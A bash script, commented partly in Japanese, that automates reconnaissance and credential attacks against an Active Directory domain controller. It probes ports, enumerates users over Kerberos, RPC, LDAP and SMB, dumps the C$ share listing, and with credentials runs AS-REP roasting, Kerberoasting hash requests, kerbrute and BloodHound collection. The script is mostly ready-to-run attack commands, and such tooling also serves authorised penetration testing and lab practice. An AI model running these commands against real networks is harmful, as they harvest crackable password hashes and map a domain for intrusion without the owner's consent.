#!/bin/bash
set -u

TARGET=${1:-}
USERNAME=${2:-}
PASSWORD=${3:-}
DOMAIN=${4:-}

if [ -z "${TARGET:-}" ]; then
  echo "Usage: $0 <target_ip> [username] [password] [domain]"
  exit 1
fi

TS=$(date +"%Y%m%d_%H%M")
OUTDIR="./results/${TARGET}_${TS}"
mkdir -p "$OUTDIR"
REPORT="$OUTDIR/report.txt"

echo "[*] Output directory: $OUTDIR" | tee -a "$REPORT"
echo "[*] Starting AD enumeration for $TARGET..." | tee -a "$REPORT"
echo "[*] Saving summary to $REPORT" | tee -a "$REPORT"

# ---------- helpers ----------
port_open_tcp() {
  # $1 host, $2 port, $3 timeout(s)
  local h=$1 p=$2 t=${3:-2}
  (exec 3<>/dev/tcp/"$h"/"$p") >/dev/null 2>&1 && { exec 3>&- 3<&-; return 0; }
  command -v nc >/dev/null 2>&1 && nc -z -w "$t" "$h" "$p" >/dev/null 2>&1 && return 0
  command -v timeout >/dev/null 2>&1 && timeout "$t" bash -c "echo >/dev/tcp/$h/$p" >/dev/null 2>&1 && return 0
  return 1
}

port_open_udp() {
  # best-effort: bash /dev/udp
  local h=$1 p=$2 t=${3:-2}
  command -v timeout >/dev/null 2>&1 && timeout "$t" bash -c "echo >/dev/udp/$h/$p" >/dev/null 2>&1 && return 0
  return 1
}

run_and_log() {
  local desc="$1"; local cmd="$2"; local file="$OUTDIR/$3"
  echo -e "\n[***] $desc" | tee -a "$REPORT"
  echo "[CMD] $cmd" | tee -a "$REPORT"
  eval "$cmd" 2>&1 | tee "$file" | tee -a "$REPORT"
}

run_if_open_tcp() {
  local port=$1; shift
  if port_open_tcp "$TARGET" "$port"; then
    run_and_log "$@"
  else
    echo "[-] Port $port (TCP) closed or filtered. Skipping $2" | tee -a "$REPORT"
  fi
}

run_if_open_udp() {
  local port=$1; shift
  if port_open_udp "$TARGET" "$port"; then
    run_and_log "$@"
  else
    echo "[-] Port $port (UDP) closed or filtered. Skipping $2" | tee -a "$REPORT"
  fi
}

# ---------- 53 DNS ----------
# UDP優先チェック（digはUDP主体）
run_if_open_udp 53 "Port 53 - DNS (UDP)" \
  "dig @${TARGET} version.bind CHAOS TXT +time=3 +tries=1" "dns.txt"

# ---------- 88 Kerberos (TCP) ----------
run_if_open_tcp 88 "Port 88 - Kerberos (TCP user enum)" \
  "nmap --script=krb5-enum-users --script-args='userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' -p88 ${TARGET} -Pn --max-retries 1 --host-timeout 30s" \
  "kerberos.txt"

# ---------- 135 RPC ----------
if [ -z "${USERNAME}" ]; then
  run_if_open_tcp 135 "Port 135 - RPC (anonymous) srvinfo" \
    "rpcclient -U '' -N ${TARGET} -c 'srvinfo'" "rpc_srvinfo_anon.txt"
  run_if_open_tcp 135 "Port 135 - RPC (anonymous) enumdomusers" \
    "rpcclient -U '' -N ${TARGET} -c 'enumdomusers'" "rpc_enumdomusers_anon.txt"
else
  run_if_open_tcp 135 "Port 135 - RPC (auth) srvinfo" \
    "rpcclient -U '${USERNAME}%${PASSWORD}' ${TARGET} -c 'srvinfo'" "rpc_srvinfo_auth.txt"
  run_if_open_tcp 135 "Port 135 - RPC (anonymous) enumdomusers" \
    "rpcclient -U '' -N ${TARGET} -c 'enumdomusers'" "rpc_enumdomusers_anon.txt"
fi

# ---------- 139 NetBIOS ----------
run_if_open_tcp 139 "Port 139 - NetBIOS" \
  "nmblookup -A ${TARGET}" "netbios.txt"

# ---------- 389 LDAP ----------
if [ -z "${USERNAME}" ]; then
  run_if_open_tcp 389 "Port 389 - LDAP (anon)" \
    "ldapsearch -x -H ldap://${TARGET} -s base namingcontexts -o nettimeout=3" "ldap_anon.txt"
else
  run_if_open_tcp 389 "Port 389 - LDAP (auth)" \
    "ldapsearch -x -H ldap://${TARGET} -D '${USERNAME}' -w '${PASSWORD}' -s base namingcontexts -o nettimeout=3" "ldap_auth.txt"
fi

# ---------- 445 SMB ----------
if [ -z "${USERNAME}" ]; then
  run_if_open_tcp 445 "Port 445 - SMB (anon) share list" \
    "smbclient -N -L //${TARGET}" "smb_anon.txt"
  run_if_open_tcp 445 "Port 445 - enum4linux (anon)" \
    "enum4linux -a ${TARGET}" "enum4linux_anon.txt"
else
  run_if_open_tcp 445 "Port 445 - SMB (auth) C$ dir" \
    "smbclient //${TARGET}/C$ -U '${USERNAME}%${PASSWORD}' -c 'dir'" "smb_auth_c_dirdump.txt"
  run_if_open_tcp 445 "Port 445 - smbmap (auth)" \
    "smbmap -H ${TARGET} -u '${USERNAME}' -p '${PASSWORD}' -r" "smbmap_auth.txt"
  run_if_open_tcp 445 "Port 445 - enum4linux (auth-ish/混在)" \
    "enum4linux -a ${TARGET}" "enum4linux_auth.txt"
  run_if_open_tcp 445 "Port 445 - lookupsid (auth)" \
    "impacket-lookupsid '${DOMAIN}/${USERNAME}:${PASSWORD}@${TARGET}'" "lookupsid.txt"
fi

# ---------- 464, 636, 3268, 3269（必要に応じて追加の軽い確認だけ） ----------
run_if_open_tcp 464 "Port 464 - kpasswd (ping)" "echo 'open'" "kpasswd_ping.txt"
run_if_open_tcp 636 "Port 636 - LDAPS (banner)" "echo | openssl s_client -connect ${TARGET}:636 -servername ${TARGET} -brief 2>/dev/null || true" "ldaps_banner.txt"
run_if_open_tcp 3268 "Port 3268 - Global Catalog LDAP" "echo 'GC open'" "gc_ldap_ping.txt"
run_if_open_tcp 3269 "Port 3269 - Global Catalog LDAPS" "echo | openssl s_client -connect ${TARGET}:3269 -servername ${TARGET} -brief 2>/dev/null || true" "gc_ldaps_banner.txt"

# ---------- 88系：パスありのときだけAS-REP / SPN ----------
if [ -n "${USERNAME}" ]; then
  run_if_open_tcp 88 "Port 88 - Kerberos AS-REP (auth)" \
    "impacket-GetNPUsers '${DOMAIN}/${USERNAME}:${PASSWORD}@${TARGET}' -dc-ip ${TARGET}" "asrep.txt"

  run_if_open_tcp 88 "Port 88 - Kerberoasting (SPN request)" \
    "impacket-GetUserSPNs -request -dc-ip ${TARGET} ${DOMAIN}/${USERNAME}" "kerberoast_spns.txt"

  # 追加の列挙（DNSが53/TCP閉でも Kerberosが開いていれば動くケースあり）
  run_if_open_tcp 88 "Port 88 - kerbrute userenum" \
    "kerbrute userenum --dc ${TARGET} -d ${DOMAIN} userlist" "kerbrute_userenum.txt"

  # 389が開いているときにBloodHound収集（名前解決に53/389があると安定）
  if port_open_tcp "$TARGET" 389; then
    run_and_log "BloodHound (LDAP collect)" \
      "bloodhound-python -d ${DOMAIN} -u '${USERNAME}' -p '${PASSWORD}' -c all -ns ${TARGET}" \
      "bloodhound_collect.txt"
  else
    echo "[-] Port 389 closed: skipping bloodhound-python" | tee -a "$REPORT"
  fi
else
  echo "[*] Port 88 - No credentials: consider GetNPUsers (AS-REP roasting) manually." | tee -a "$REPORT"
fi

echo -e "\n[+] Done. Results in $OUTDIR" | tee -a "$REPORT"

